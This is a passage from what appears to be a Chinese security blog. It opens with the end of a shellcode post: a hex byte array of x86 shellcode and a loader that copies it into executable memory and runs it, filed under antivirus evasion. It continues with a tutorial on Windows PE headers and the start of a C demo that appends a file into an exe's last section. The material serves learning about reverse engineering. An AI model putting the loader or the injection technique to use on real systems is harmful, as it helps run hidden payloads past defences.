class="number">0xEC</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xF8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xEB</span>, <span class="number">0x09</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xFC</span>, <span class="number">0x83</span>, <span class="number">0xC0</span>, <span class="number">0x01</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0xB7</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x4A</span>, <span class="number">0x85</span>, <span class="number">0xC0</span>, <span class="number">0x74</span>, <span class="number">0x0B</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0xF8</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0xC1</span>, <span class="number">0x01</span>, <span class="number">0x89</span>, <span class="number">0x4D</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xF8</span>, <span class="number">0x8B</span>, <span class="number">0xE5</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x0C</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x50</span>, <span class="number">0xE8</span>, <span class="number">0xB1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x83</span>,</span><br><span class="line">    <span class="number">0xC4</span>, <span class="number">0x04</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xF8</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xE8</span>, <span class="number">0xA2</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xF4</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0xF8</span>, <span class="number">0x3B</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0x75</span>, <span class="number">0x3E</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xEB</span>, <span class="number">0x09</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0xC0</span>, <span class="number">0x01</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>,</span><br><span class="line">    <span class="number">0xFC</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xF8</span>, <span class="number">0x7D</span>, <span class="number">0x1E</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0xB7</span>, <span class="number">0x0C</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0x0F</span>, <span class="number">0xB7</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x50</span>, <span class="number">0x3B</span>, <span class="number">0xCA</span>, <span class="number">0x74</span>, <span class="number">0x04</span>, <span class="number">0x32</span>, <span class="number">0xC0</span>,</span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0x0A</span>, <span class="number">0xEB</span>, <span class="number">0xD1</span>, <span class="number">0xB0</span>, <span class="number">0x01</span>, <span class="number">0xEB</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0x02</span>, <span class="number">0x32</span>, <span class="number">0xC0</span>, <span class="number">0x8B</span>, <span class="number">0xE5</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x0C</span>, <span class="number">0xE8</span>, <span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xF4</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xF4</span>, <span class="number">0x8B</span>, <span class="number">0x48</span>, <span class="number">0x0C</span>, <span class="number">0x89</span>, <span class="number">0x4D</span>, <span class="number">0xF8</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xF8</span>, <span class="number">0x8B</span>, <span class="number">0x42</span>, <span class="number">0x0C</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0xF8</span>, <span class="number">0x8B</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x3B</span>, <span class="number">0x42</span>, <span class="number">0x0C</span>, <span class="number">0x74</span>, <span class="number">0x2C</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0x42</span>, <span class="number">0x30</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0x53</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0xB6</span>, <span class="number">0xC8</span>, <span class="number">0x85</span>, <span class="number">0xC9</span>, <span class="number">0x74</span>, <span class="number">0x08</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0x42</span>, <span class="number">0x18</span>, <span class="number">0xEB</span>, <span class="number">0x0C</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0x08</span>, <span class="number">0x89</span>, <span class="number">0x4D</span>, <span class="number">0xFC</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0x33</span>, <span class="number">0xC0</span>, <span class="number">0x8B</span>, <span class="number">0xE5</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x3C</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xE0</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0xE0</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x3C</span>, <span class="number">0x03</span>, <span class="number">0x55</span>, <span class="number">0x08</span>, <span class="number">0x89</span>, <span class="number">0x55</span>, <span class="number">0xDC</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0xC8</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0xDC</span>, <span class="number">0x8B</span>, <span class="number">0x44</span>, <span class="number">0x0A</span>, <span class="number">0x78</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xE8</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0xE8</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x51</span>, <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x55</span>, <span class="number">0x08</span>, <span class="number">0x89</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0xD8</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0x09</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xF4</span>, <span class="number">0x83</span>, <span class="number">0xC0</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xF4</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0xE8</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0xF4</span>, <span class="number">0x3B</span>, <span class="number">0x51</span>, <span class="number">0x18</span>, <span class="number">0x0F</span>, <span class="number">0x83</span>, <span class="number">0xAC</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xF4</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x14</span>, <span class="number">0x81</span>, <span class="number">0x03</span>, <span class="number">0x55</span>, <span class="number">0x08</span>, <span class="number">0x89</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0xD4</span>, <span class="number">0x89</span>, <span class="number">0x4D</span>, <span class="number">0xF0</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0xF0</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0x02</span>, <span class="number">0x88</span>, <span class="number">0x45</span>, <span class="number">0xFF</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0xEC</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0x01</span>, <span class="number">0x75</span>, <span class="number">0x2E</span>, <span class="number">0x80</span>, <span class="number">0x7D</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0xF0</span>, <span class="number">0x8A</span>, <span class="number">0x42</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x88</span>, <span class="number">0x45</span>, <span class="number">0xFE</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x75</span>, <span class="number">0x17</span>, <span class="number">0x83</span>, <span class="number">0x45</span>, <span class="number">0xF0</span>, <span class="number">0x02</span>, <span class="number">0x83</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0xEC</span>, <span class="number">0x02</span>, <span class="number">0x80</span>, <span class="number">0x7D</span>, <span class="number">0xFE</span>, <span class="number">0x00</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0x08</span>, <span class="number">0x1B</span>, <span class="number">0xD2</span>, <span class="number">0x83</span>, <span class="number">0xCA</span>, <span class="number">0x01</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xE4</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xE4</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0xD0</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x7D</span>, <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x3B</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0x8B</span>, <span class="number">0x51</span>, <span class="number">0x24</span>, <span class="number">0x03</span>, <span class="number">0x55</span>, <span class="number">0x08</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xCC</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xF4</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x14</span>, <span class="number">0x41</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x55</span>, <span class="number">0xF8</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xE8</span>, <span class="number">0x8B</span>, <span class="number">0x48</span>, <span class="number">0x1C</span>, <span class="number">0x03</span>, <span class="number">0x4D</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x89</span>, <span class="number">0x4D</span>, <span class="number">0xC8</span>, <span class="number">0x0F</span>, <span class="number">0xB7</span>, <span class="number">0x55</span>, <span class="number">0xF8</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xC8</span>, <span class="number">0x8B</span>, <span class="number">0x0C</span>, <span class="number">0x90</span>, <span class="number">0x03</span>, <span class="number">0x4D</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x89</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0xC4</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0xE9</span>, <span class="number">0x3C</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x33</span>, <span class="number">0xC0</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0xE5</span>, <span class="number">0x5D</span>, <span class="number">0xC2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPVOID addressPointer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(hexData), <span class="number">4096</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(addressPointer, hexData, <span class="built_in">sizeof</span>(hexData));</span><br><span class="line"></span><br><span class="line">    ((func)addressPointer)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Virus AV</category>
      </categories>
      <tags>
        <tag>Shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构学习</title>
    <url>/2024/02/12/Reverse/PE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240211154051266.png" alt="image-20240211154051266"></p>
<p>PE文件的结构体都定义在<strong>winnt.h</strong>中，包含使用即可。</p>
<span id="more"></span>

<h2 id="DOS部分"><a href="#DOS部分" class="headerlink" title="DOS部分"></a>DOS部分</h2><p>涉及到DOS头，主要是为了16位程序定义的，我们关心的部分不多，主要是<strong>e_magic</strong>和<strong>e_lfanew</strong>两个结构体成员，其他的基本都可以瞎改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number 一般都是字符串MZ</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// 标明NT头的偏移</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>



<h2 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h2><p>也就是常说的NT头部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;                         <span class="comment">// 一般都是字符串PE</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;            <span class="comment">// 标明标准PE头的偏移</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;  <span class="comment">// 标明扩展PE头的偏移</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>

<p>下面是标准PE头的注解：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;                        <span class="comment">// 当前程序的平台架构</span></span><br><span class="line">    WORD    NumberOfSections;               <span class="comment">// 节的数量</span></span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 时间戳（无关紧要）</span></span><br><span class="line">    DWORD   PointerToSymbolTable;           <span class="comment">// 符号表指向（无关紧要）</span></span><br><span class="line">    DWORD   NumberOfSymbols;                <span class="comment">// 符号数量（无关紧要）</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;           <span class="comment">// 扩展PE头的大小</span></span><br><span class="line">    WORD    Characteristics;                <span class="comment">// 文件属性（EXE、DLL等等）</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<p>下面是扩展PE头主要结构体成员的注解：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;                          <span class="comment">// x64-0x20b x86-0x10b</span></span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;            <span class="comment">// 程序的入口地址</span></span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;                      <span class="comment">// 内存镜像基地址</span></span><br><span class="line">    DWORD   SectionAlignment;               <span class="comment">// 内存对齐大小</span></span><br><span class="line">    DWORD   FileAlignment;                  <span class="comment">// 文件对齐大小</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;          <span class="comment">// 不可篡改</span></span><br><span class="line">    WORD    MinorSubsystemVersion;          <span class="comment">// 不可篡改</span></span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;                    <span class="comment">// PE文件映射到内存中的大小，注意内存对齐</span></span><br><span class="line">    DWORD   SizeOfHeaders;                  <span class="comment">// PE文件头和节表整体的大小</span></span><br><span class="line">    DWORD   CheckSum;                       <span class="comment">// 校验和，判断文件是否被修改</span></span><br><span class="line">    WORD    Subsystem;                      <span class="comment">// 子系统</span></span><br><span class="line">    WORD    DllCharacteristics;             <span class="comment">// 可用于设定是否随机基地址</span></span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>



<h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];      <span class="comment">// 节表的名称</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;                <span class="comment">// 节原始大小</span></span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                     <span class="comment">// 内存中的偏移，注意内存对齐</span></span><br><span class="line">    DWORD   SizeOfRawData;                      <span class="comment">// 文件对齐后的节大小</span></span><br><span class="line">    DWORD   PointerToRawData;                   <span class="comment">// 文件中的偏移，注意文件对齐</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;                    <span class="comment">// 节属性（可读、可写、可执行等等）</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>写一个Demo，利用C语言实现在exe文件的最后一个节中添加一个文件，那么需要修改的值为：</p>
<ul>
<li>节表最后一项的节原始大小 VirtualSize</li>
<li>节表最后一项的文件对齐后的节大小 SizeOfRawData</li>
<li>PE扩展头的 SizeOfImage</li>
</ul>
<p><strong>注意的是文件对齐和内存对齐的处理。</strong>Demo如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">FileToMemory</span><span class="params">(<span class="type">char</span> filepath[], <span class="type">char</span>** buf)</span> &#123;</span><br><span class="line">	FILE* file = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> filelen = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">errno_t</span> err = fopen_s(&amp;file, filepath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">	filelen = ftell(file);</span><br><span class="line">	fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">	*buf = (<span class="type">char</span> *)VirtualAlloc(<span class="literal">NULL</span>, filelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	fread(*buf, <span class="number">1</span>, filelen, file);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> filelen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> addfilepath[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="type">char</span> exefilepath[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="type">char</span> mergefilepath[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> addfilelen = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> exefilelen = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span>* addfilebuf = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>* exefilebuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将文件加载到内存中去</span></span><br><span class="line">	addfilelen = FileToMemory(addfilepath, &amp;addfilebuf);</span><br><span class="line">	exefilelen = FileToMemory(exefilepath, &amp;exefilebuf);</span><br><span class="line">	<span class="keyword">if</span> (addfilelen &lt; <span class="number">0</span> || exefilelen &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;File is not exsiting!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取结构体</span></span><br><span class="line">	PIMAGE_DOS_HEADER 